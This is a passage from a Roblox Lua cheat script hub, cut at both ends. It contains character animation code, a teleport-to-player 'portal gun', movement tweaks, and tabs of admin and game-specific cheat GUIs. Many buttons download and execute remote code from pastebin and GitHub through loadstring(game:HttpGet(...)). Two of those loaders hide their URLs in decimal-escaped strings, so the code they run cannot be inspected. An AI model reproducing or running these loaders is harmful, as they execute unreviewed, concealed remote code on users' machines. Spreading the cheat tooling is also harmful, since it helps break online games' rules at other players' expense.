lookvector = -reanim.Humanoid.WalkSpeed
end
if rightvector > reanim.Humanoid.WalkSpeed then
rightvector = reanim.Humanoid.WalkSpeed
end
if rightvector < -reanim.Humanoid.WalkSpeed then
rightvector = -reanim.Humanoid.WalkSpeed
end
local lookvel = lookvector / reanim.Humanoid.WalkSpeed
local rightvel = rightvector / reanim.Humanoid.WalkSpeed
if reanim.Humanoid.Jump then -- jump
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1.47+0.5*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(-45+5.58*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(0.68+0*math.cos(sine/10),0+0*math.cos(sine/10),0.93+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(-24.98+0*math.cos(sine/10)),math.rad(113+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-0.68+0*math.cos(sine/10),0+0*math.cos(sine/10),0.93+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(24.98+0*math.cos(sine/10)),math.rad(-113+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(1.7+0*math.cos(sine/10),0.5+0*math.cos(sine/10),1.4+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+28.51*math.cos(sine/10)),math.rad(-24.98+-32.62*math.cos(sine/10)),math.rad(113+28.51*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-1.7+0*math.cos(sine/10),0.5+0*math.cos(sine/10),1.4+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+28.51*math.cos(sine/10)),math.rad(24.98+32.62*math.cos(sine/10)),math.rad(-113+-28.51*math.cos(sine/10))),.2)
elseif Root.Velocity.y < -1 and reanim.Humanoid.Jump then -- fall
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1.47+0.5*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(-45+5.58*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(0.68+0*math.cos(sine/10),0+0*math.cos(sine/10),0.93+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(-24.98+0*math.cos(sine/10)),math.rad(113+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-0.68+0*math.cos(sine/10),0+0*math.cos(sine/10),0.93+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(24.98+0*math.cos(sine/10)),math.rad(-113+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(1.7+0*math.cos(sine/10),0.5+0*math.cos(sine/10),1.4+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+28.51*math.cos(sine/10)),math.rad(-24.98+-32.62*math.cos(sine/10)),math.rad(113+28.51*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-1.7+0*math.cos(sine/10),0.5+0*math.cos(sine/10),1.4+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+28.51*math.cos(sine/10)),math.rad(24.98+32.62*math.cos(sine/10)),math.rad(-113+-28.51*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude < 2 then -- idle
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1.22+0.14*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(-90+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(-24.98+2.5*math.cos(sine/10)),math.rad(90+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(24.98+-2.5*math.cos(sine/10)),math.rad(-90+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(2.54+0*math.cos(sine/10),0+0*math.cos(sine/10),0.2+-0.14*math.cos(sine/10))*CFrame.Angles(math.rad(90+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-2.54+0*math.cos(sine/10),0+0*math.cos(sine/10),0.2+-0.14*math.cos(sine/10))*CFrame.Angles(math.rad(90+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude < 20 then -- walk
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1.47+0.5*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(-45+5.58*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(0.68+0*math.cos(sine/10),0+0*math.cos(sine/10),0.93+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(-24.98+0*math.cos(sine/10)),math.rad(113+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-0.68+0*math.cos(sine/10),0+0*math.cos(sine/10),0.93+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(24.98+0*math.cos(sine/10)),math.rad(-113+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(1.7+0*math.cos(sine/10),0.5+0*math.cos(sine/10),1.4+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+28.51*math.cos(sine/10)),math.rad(-24.98+-32.62*math.cos(sine/10)),math.rad(113+28.51*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-1.7+0*math.cos(sine/10),0.5+0*math.cos(sine/10),1.4+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+28.51*math.cos(sine/10)),math.rad(24.98+32.62*math.cos(sine/10)),math.rad(-113+-28.51*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude > 20 then -- run
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1.47+0.5*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(-45+5.58*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(0.68+0*math.cos(sine/10),0+0*math.cos(sine/10),0.93+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(-24.98+0*math.cos(sine/10)),math.rad(113+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-0.68+0*math.cos(sine/10),0+0*math.cos(sine/10),0.93+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(24.98+0*math.cos(sine/10)),math.rad(-113+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(1.7+0*math.cos(sine/10),0.5+0*math.cos(sine/10),1.4+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+28.51*math.cos(sine/10)),math.rad(-24.98+-32.62*math.cos(sine/10)),math.rad(113+28.51*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-1.7+0*math.cos(sine/10),0.5+0*math.cos(sine/10),1.4+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+28.51*math.cos(sine/10)),math.rad(24.98+32.62*math.cos(sine/10)),math.rad(-113+-28.51*math.cos(sine/10))),.2)
end
srv.RenderStepped:Wait()
end
end)()
--Created using Nexo Animator V4
end)

Section:NewButton("Fe Fake Death", "Easy death lol", function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\122\74\105\54\115\80\71\87\39\41\41\40\41\10")()
end)

Section:NewButton("Fe Portal Gun", "To To player", function()
function make_portal_gun_and_GUI()
	portal_gun = Instance.new("Tool")
	portal_gun.Name = "Portal_Gun"
	portal_gun.Parent = workspace

	Handle = Instance.new("Part")
	Handle.Name = "Handle"
	Handle.Parent = portal_gun
	Handle.Color = Color3.fromRGB(231, 231, 236)
	Handle.Material = Enum.Material.Plastic
	Handle.Size = Vector3.new(1.045, 0.453, 0.453)
	Handle.Position = Vector3.new(-10.028, 4.312, 19.112)
	Handle.Orientation = Vector3.new(0, -180, 107.64)
	Handle.BackSurface = Enum.SurfaceType.SmoothNoOutlines
	Handle.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
	Handle.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
	Handle.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
	Handle.RightSurface = Enum.SurfaceType.SmoothNoOutlines
	Handle.TopSurface = Enum.SurfaceType.SmoothNoOutlines

	Union = Instance.new("Part")
	Union.Color = Color3.fromRGB(0, 255, 0)
	Union.Material = Enum.Material.Plastic
	Union.Transparency = 0.45
	Union.Name = "Union"

	Union.Size = Vector3.new(0.304, 0.476, 0.302)
	Union.Position = Vector3.new(-8.972, 5.269, 19.079)
	Union.Orientation = Vector3.new(0, 180, -3.64)
	Union.Parent = portal_gun

	part1 = Instance.new("Part")
	part1.Name = "part1"
	part1.Color = Color3.fromRGB(17, 17, 17)
	part1.Material = Enum.Material.Plastic
	part1.Size = Vector3.new(0.2, 0.24, 0.99)
	part1.Position = Vector3.new(-8.716, 4.926, 19.111)
	part1.Orientation = Vector3.new(0, 180, -3.64)
	part1.BackSurface = Enum.SurfaceType.SmoothNoOutlines
	part1.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
	part1.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
	part1.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
	part1.RightSurface = Enum.SurfaceType.SmoothNoOutlines
	part1.TopSurface = Enum.SurfaceType.SmoothNoOutlines
	part1.Parent = portal_gun

	part2 = Instance.new("Part")
	part2.Name = "part2"
	part2.Color = Color3.fromRGB(231, 231, 236)
	part2.Material = Enum.Material.Plastic
	part2.Size = Vector3.new(1.04, 0.3, 0.48)
	part2.Position = Vector3.new(-9.874, 4.855, 19.095)
	part2.Orientation = Vector3.new(-0.02, 90, 0)
	part2.BackSurface = Enum.SurfaceType.SmoothNoOutlines
	part2.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
	part2.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
	part2.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
	part2.RightSurface = Enum.SurfaceType.SmoothNoOutlines
	part2.TopSurface = Enum.SurfaceType.SmoothNoOutlines
	part2.Shape = Enum.PartType.Cylinder
	part2.Parent = portal_gun

	part3 = Instance.new("Part")
	part3.Name = "part3"
	part3.Color = Color3.fromRGB(17, 17, 17)
	part3.Material = Enum.Material.Plastic
	part3.Size = Vector3.new(0.2, 0.47, 0.45)
	part3.Position = Vector3.new(-8.939, 4.948, 19.086)
	part3.Orientation = Vector3.new(3.47, -90, -90)
	part3.Shape = Enum.PartType.Cylinder
	part3.Parent = portal_gun

	part4 = Instance.new("Part")
	part4.Name = "part4"
	part4.Color = Color3.fromRGB(231, 231, 236)
	part4.Material = Enum.Material.Plastic
	part4.Size = Vector3.new(1.04, 0.3, 0.48)
	part4.Position = Vector3.new(-9.874, 4.845, 19.095)
	part4.Orientation = Vector3.new(-0.02, 90, 0)
	part4.Shape = Enum.PartType.Cylinder
	part4.BackSurface = Enum.SurfaceType.SmoothNoOutlines
	part4.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
	part4.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
	part4.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
	part4.RightSurface = Enum.SurfaceType.SmoothNoOutlines
	part4.TopSurface = Enum.SurfaceType.SmoothNoOutlines
	part4.Parent = portal_gun

	part5 = Instance.new("Part")
	part5.Name = "part5"
	part5.Color = Color3.fromRGB(17, 17, 17)
	part5.Material = Enum.Material.Plastic
	part5.Parent = portal_gun
	part5.Size = Vector3.new(0.2, 0.2, 0.2)
	part5.Position = Vector3.new(-9.894, 4.93, 19.061)
	part5.Orientation = Vector3.new(11.67, -90, -90)

	part6 = Instance.new("Part")
	part6.Name = "part6"
	part6.Color = Color3.fromRGB(0, 255, 0)
	part6.Material = Enum.Material.Neon
	part6.Size = Vector3.new(0.2, 0.31, 0.2)
	part6.Position = Vector3.new(-8.715, 4.919, 19.095)
	part6.Orientation = Vector3.new(0, 180, -3.64)
	part6.Shape = Enum.PartType.Cylinder
	part6.Parent = portal_gun

	part7 = Instance.new("Part")
	part7.Name = "part7"
	part7.Color = Color3.fromRGB(231, 231, 236)
	part7.Material = Enum.Material.Plastic
	part7.Size = Vector3.new(1.04, 0.3, 0.48)
	part7.Position = Vector3.new(-9.874, 4.865, 19.095)
	part7.Orientation = Vector3.new(-0.02, 90, 0)
	part7.BackSurface = Enum.SurfaceType.SmoothNoOutlines
	part7.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
	part7.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
	part7.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
	part7.RightSurface = Enum.SurfaceType.SmoothNoOutlines
	part7.TopSurface = Enum.SurfaceType.SmoothNoOutlines
	part7.Shape = Enum.PartType.Cylinder
	part7.Parent = portal_gun

	part8 = Instance.new("Part")
	part8.Name = "part8"
	part8.Color = Color3.fromRGB(248, 248, 248)
	part8.Material = Enum.Material.SmoothPlastic
	part8.Transparency = 1
	part8.Size = Vector3.new(0.2, 0.2, 0.2)
	part8.Position = Vector3.new(-8.952, 5.2, 19.088)
	part8.Orientation = Vector3.new(0, 0, 3.64)
	part8.Parent = portal_gun
	part8_smoke = Instance.new("Smoke")
	part8_smoke.Color = Color3.fromRGB(82, 255, 82)
	part8_smoke.Size = 0.1
	part8_smoke.RiseVelocity = 8
	part8_smoke.Parent = part8

	part9 = Instance.new("Part")
	part9.Name = "part9"
	part9.Color = Color3.new(117, 0, 0)
	part9.Material = Enum.Material.Plastic
	part9.Size = Vector3.new(0.24, 0.27, 0.54)
	part9.Position = Vector3.new(-9.543, 4.891, 19.086)
	part9.Orientation = Vector3.new(0, 180, -3.64)
	part9.BackSurface = Enum.SurfaceType.SmoothNoOutlines
	part9.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
	part9.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
	part9.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
	part9.RightSurface = Enum.SurfaceType.SmoothNoOutlines
	part9.TopSurface = Enum.SurfaceType.SmoothNoOutlines
	part9_surface_GUI = Instance.new("SurfaceGui")
	part9_surface_GUI.Face = Enum.NormalId.Top
	part9_surface_GUI.CanvasSize = Vector2.new(800, 600)
	part9_surface_GUI.Parent = part9
	part9_textlabel = Instance.new("TextLabel")
	part9_textlabel.Parent = part9_surface_GUI
	part9_textlabel.BackgroundTransparency = 1
	part9_textlabel.BorderSizePixel = 1
	part9_textlabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	part9_textlabel.Text = "Player"
	part9_textlabel.TextScaled = false
	part9_textlabel.TextSize = 100
	part9_textlabel.TextStrokeTransparency = 1
	part9_textlabel.Size = UDim2.new(1, 0, 1, 0) -- {1, 0},{1, 0}
	part9.Parent = portal_gun

	part10 = Instance.new("Part")
	part10.Name = "part10"
	part10.Color = Color3.fromRGB(0, 255, 0)
	part10.Material = Enum.Material.Neon
	part10.Size = Vector3.new(0.2, 0.31, 0.2)
	part10.Position = Vector3.new(-8.715, 4.919, 19.456)
	part10.Orientation = Vector3.new(0, 180, -3.64)
	part10.Shape = Enum.PartType.Cylinder
	part10.Parent = portal_gun

	part11 = Instance.new("Part")
	part11.Name = "part11"
	part11.Color = Color3.fromRGB(0, 255, 0)
	part11.Size = Vector3.new(0.2, 0.31, 0.2)
	part11.Position = Vector3.new(-8.715, 4.919, 18.765)
	part11.Orientation = Vector3.new(0, 180, -3.64)
	part11.Shape = Enum.PartType.Cylinder
	part11.Parent = portal_gun

	part12 = Instance.new("Part")
	part12.Name = "part12"
	part12.Color = Color3.fromRGB(231, 231, 236)
	part12.Material = Enum.Material.Plastic
	part12.Size = Vector3.new(1.31, 0.27, 1.03)
	part12.Position = Vector3.new(-9.279, 4.886, 19.101)
	part12.Orientation = Vector3.new(0, 180, -3.64)
	part12.BackSurface = Enum.SurfaceType.SmoothNoOutlines
	part12.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
	part12.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
	part12.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
	part12.RightSurface = Enum.SurfaceType.SmoothNoOutlines
	part12.TopSurface = Enum.SurfaceType.SmoothNoOutlines
	part12.Parent = portal_gun

	part14 = Instance.new("Part")
	part14.Name = "part14"
	part14.Color = Color3.fromRGB(231, 231, 236)
	part14.Material = Enum.Material.Plastic
	part14.Size = Vector3.new(1.04, 0.3, 0.48)
	part14.Position = Vector3.new(-9.874, 4.875, 19.095)
	part14.Orientation = Vector3.new(-0.02, 90, 0)
	part14.Shape = Enum.PartType.Cylinder
	part14.BackSurface = Enum.SurfaceType.SmoothNoOutlines
	part14.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
	part14.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
	part14.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
	part14.RightSurface = Enum.SurfaceType.SmoothNoOutlines
	part14.TopSurface = Enum.SurfaceType.SmoothNoOutlines
	part14.Parent = portal_gun

	portal_gun.GripForward = Vector3.new(0, 0, -1)
	portal_gun.GripPos= Vector3.new(0, -0.2, 0)
	portal_gun.GripRight = Vector3.new(0, 0, -1)
	portal_gun.GripUp = Vector3.new(1, 0.015, 0)

	portal_sound = Instance.new("Sound")
	portal_sound.Parent = portal_gun.Handle
	portal_sound.SoundId = "rbxassetid://1013378689"
	portal_sound.Volume = 2.5

	function Weld(x,y)
		local W = Instance.new("Weld")
		W.Part0 = x
		W.Part1 = y
		local CJ = CFrame.new(x.Position)
		local C0 = x.CFrame:inverse()*CJ
		local C1 = y.CFrame:inverse()*CJ
		W.C0 = C0
		W.C1 = C1
		W.Parent = x
	end

	for i,v in pairs(portal_gun:GetChildren()) do
		if v:IsA("Part") then
			Weld(v, portal_gun.Handle)
		end
	end

	portal_gun.Parent = game.Players.LocalPlayer.Backpack

	rick_portal_GUI = Instance.new("ScreenGui")
	rick_portal_GUI.Name = "rick_portal_GUI"
	frame = Instance.new("Frame")
	frame.Parent = rick_portal_GUI
	frame.BackgroundTransparency = 0
	textbox = Instance.new("TextBox")
	textbox.BorderSizePixel = 0
	textbox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	textbox.TextColor3 = Color3.fromRGB(255, 255, 255)
	textbox.Size = UDim2.new(0, 310, 0, 40) -- {0, 310},{0, 40}
	textbox.Position = UDim2.new(0.12, 5, 3.44, 290) -- {0.12, 5},{3.44, 290}
	textbox.Parent = frame
	textbox.BackgroundTransparency = 0.5
	textbox.TextScaled = true
	textbox.Text = "Shorted Real Player Name"
	rick_portal_GUI.Parent = game.Players.LocalPlayer.PlayerGui

	function open_portal()
		local player_to_teleport_to_name = game.Players.LocalPlayer.PlayerGui.rick_portal_GUI.Frame.TextBox.Text
		local player_to_teleport_to = nil
		for i,v in pairs(game.Players:GetPlayers()) do
			if v.Name:lower():match(player_to_teleport_to_name:lower()) then
				player_to_teleport_to = v
			end
		end
		portal_sound:Play()
		local portal = Instance.new("Part")
		portal.Name = "portal"
		portal.Transparency = 1
		portal.Size = Vector3.new(6, 8, 0.001)
		portal.Orientation = Vector3.new(0, -90, 0)
		portal.Parent = workspace
		portal.Anchored = true
		portal.CanCollide = false
		local decal1 = Instance.new("Decal")
		decal1.Face = Enum.NormalId.Front
		decal1.Texture = "rbxassetid://7493310007"
		decal1.Parent = portal
		local decal2 = Instance.new("Decal")
		decal2.Face = Enum.NormalId.Back
		decal2.Texture = "rbxassetid://7493310007"
		decal2.Parent = portal
		local player_head_position = game.Players.LocalPlayer.Character.Head.Position
		portal.Position = Vector3.new(player_head_position.X+5, player_head_position.Y, player_head_position.Z)
		local light1 = Instance.new("PointLight")
		light1.Parent = portal
		light1.Brightness = 7.12
		light1.Color = Color3.fromRGB(85, 255, 0)
		light1.Range = 9
		local function teleport_to_player()
			game.Players.LocalPlayer.Character:moveTo(player_to_teleport_to.Character.Head.Position)
			local portal2 = Instance.new("Part")
			portal2.Name = "portal2"
			portal2.Transparency = 1
			portal2.Size = Vector3.new(6, 8, 0.001)
			portal2.Orientation = Vector3.new(0, -90, 0)
			portal2.Parent = workspace
			portal2.Anchored = true
			portal2.CanCollide = false
			local decal12 = Instance.new("Decal")
			decal12.Face = Enum.NormalId.Front
			decal12.Texture = "rbxassetid://7493310007"
			decal12.Parent = portal2
			local decal22 = Instance.new("Decal")
			decal22.Face = Enum.NormalId.Back
			decal22.Texture = "rbxassetid://7493310007"
			decal22.Parent = portal2
			local player_head_position = game.Players.LocalPlayer.Character.Head.Position
			portal2.Position = player_to_teleport_to.Character.Head.Position
			local light2 = Instance.new("PointLight")
			light2.Parent = portal2
			light2.Brightness = 7.12
			light2.Color = Color3.fromRGB(85, 255, 0)
			light2.Range = 9
			portal:Remove()
			wait(3)
			portal2:Remove()
		end
		portal.Touched:Connect(teleport_to_player)
	end

	portal_gun.Activated:Connect(open_portal)
end

make_portal_gun_and_GUI()

while true do
	wait(0.1)
	if game.Players.LocalPlayer.Character.Humanoid.Health == 0 then
		while game.Players.LocalPlayer.Character.Humanoid.Health == 0 do
			wait(0.1)
		end
		wait(2)
		make_portal_gun_and_GUI()
	end
end
end)


Section:NewButton("Fe Walk On Wall", "Dang hacker lol", function()
       loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()
end)

Section:NewButton("Fe MachineGunHand[Hat Needed]", "Pal Hair & International Fedora", function()
--made By YellowGreg--
--MachineGunahand--

--Hats needed--
--//pal Har\\--
--//International Fedora\\--

loadstring(game:HttpGet(("https://raw.githubusercontent.com/YellowGreg/Fe_MachineaGunHand/main/MachineGunHand")))()
end)













local Tab = Window:NewTab("Admin")

local Section = Tab:NewSection("Admin Commands")

Section:NewButton("Reviz Admin", "Adding", function()
loadstring(game:HttpGet("https://pastebin.com/raw/Caniwq2N",true))()
end)

Section:NewButton("Infinite Yield Admin", "Adding", function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
end)

Section:NewButton("IV Admin V2", "More The infinite Yeild", function()
-- // Iv- Admin
 loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\79\109\110\105\112\111\116\101\110\99\101\68\101\118\101\108\111\112\101\114\47\78\117\109\98\101\114\47\109\97\105\110\47\49\46\108\117\97"))()
end)




local Tab = Window:NewTab("A^F Team Script")
local Section = Tab:NewSection("Our Script")

Section:NewButton("NoCom Executor", "Works With Lua Script", function()
--Made By YellowGreg ok--
loadstring(game:HttpGet("https://raw.githubusercontent.com/YellowGreg/NoCom-Executor/main/NoCom"))()
end)

Section:NewButton("PrisonLifeGuiV1", "Idk", function()
--Made By YellowGreg--
loadstring(game:HttpGet("https://raw.githubusercontent.com/YellowGreg/PrisonLife-Gui-V1/main/PrisonLifeGuiV1"))()
end)

Section:NewButton("Arsenal Gui V1 (Buggy)", "V2 is gonna be more Op", function()
--Note Some Script Will Be buggy--
--Made By AdvanceFalling Team--

--NEW LOADSTRING OPEN SOURCE--

loadstring(game:HttpGet("https://raw.githubusercontent.com/YellowGreg/UltimateCromaSin-Arsenal-Gui/main/Arsenal"))()
end)

Section:NewButton("Fe MachineGunHand (Hat Needed)", "Pal Hair & International Fedora", function()
--made By YellowGreg--
--MachineGunahand--

--Hats needed--
--//pal Har\\--
--//International Fedora\\--

loadstring(game:HttpGet(("https://raw.githubusercontent.com/YellowGreg/Fe_MachineaGunHand/main/MachineGunHand")))()
end)

Section:NewButton("HarshTech7.3", "Op Has Many Scripts", function()
--HarshTechV7.3 is here and it has smore function--

loadstring(game:HttpGet("https://raw.githubusercontent.com/YellowGreg/HarshTechV7.3/main/HarshTechV7.3"))()
end)












--Player--
local Tab = Window:NewTab("Player")
local Section = Tab:NewSection("Local Player")

Section:NewTextBox("Walkspeed","Rare kavo UI walkspeed setter", function(txt) game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = txt
end)

Section:NewTextBox("FOV","Max FOV number 120", function(txt) game.Workspace.CurrentCamera.FieldOfView = txt
end)

Section:NewTextBox("JumpPower","Increases Jumping", function(txt)
game.Players.LocalPlayer.Character.Humanoid.JumpPower = txt
end)

Section:NewButton("Inf Jump", "Jump In the air many times", function()
--Subscribe To ArceusMODZ--

local InfiniteJumpEnabled = true
game:GetService("UserInputService").JumpRequest:connect(function()
	if InfiniteJumpEnabled then
		game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
	end
end)
end)

Section:NewButton("Reset JumpPower", "Normal Jump", function()
game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
end)

Section:NewButton("Reset WalkSpeed", "Normal Speed", function()
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
end)

Section:NewButton("ShiftLock", "Play Like Pc", function()
-- Gui to Lua
-- Version: 3.2

-- Instances:

local ShiftlockStarterGui = Instance.new("ScreenGui")
local ImageButton = Instance.new("ImageButton")

--Properties:

ShiftlockStarterGui.Name = "Shiftlock (StarterGui)"
ShiftlockStarterGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ShiftlockStarterGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

ImageButton.Parent = ShiftlockStarterGui
ImageButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton.BackgroundTransparency = 1.000
ImageButton.Position = UDim2.new(0.921914339, 0, 0.552375436, 0)
ImageButton.Size = UDim2.new(0.0636147112, 0, 0.0661305636, 0)
ImageButton.SizeConstraint = Enum.SizeConstraint.RelativeXX
ImageButton.Image = "http://www.roblox.com/asset/?id=182223762"

-- Scripts:

local function TLQOYN_fake_script() -- ImageButton.ShiftGUI 
	local script = Instance.new('LocalScript', ImageButton)

	local MobileCameraFramework = {}
	local players = game:GetService("Players")
	local runservice = game:GetService("RunService")
	local CAS = game:GetService("ContextActionService")
	local player = players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local root = character:WaitForChild("HumanoidRootPart")
	local humanoid = character.Humanoid
	local camera = workspace.CurrentCamera
	local button = script.Parent
	
	--Visiblity
	uis = game:GetService("UserInputService")
	ismobile = uis.TouchEnabled
	button.Visible = ismobile
	
	local states = {
		OFF = "rbxasset://textures/ui/mouseLock_off@2x.png",
		ON = "rbxasset://textures/ui/mouseLock_on@2x.png"
	}
	local MAX_LENGTH = 900000
	local active = false
	local ENABLED_OFFSET = CFrame.new(1.7, 0, 0)
	local DISABLED_OFFSET = CFrame.new(-1.7, 0, 0)
	local function UpdateImage(STATE)
		button.Image = states[STATE]
	end
	local function UpdateAutoRotate(BOOL)
		humanoid.AutoRotate = BOOL
	end
	local function GetUpdatedCameraCFrame(ROOT, CAMERA)
		return CFrame.new(root.Position, Vector3.new(CAMERA.CFrame.LookVector.X * MAX_LENGTH, root.Position.Y, CAMERA.CFrame.LookVector.Z * MAX_LENGTH))
	end
	local function EnableShiftlock()
		UpdateAutoRotate(false)
		UpdateImage("ON")
		root.CFrame = GetUpdatedCameraCFrame(root, camera)
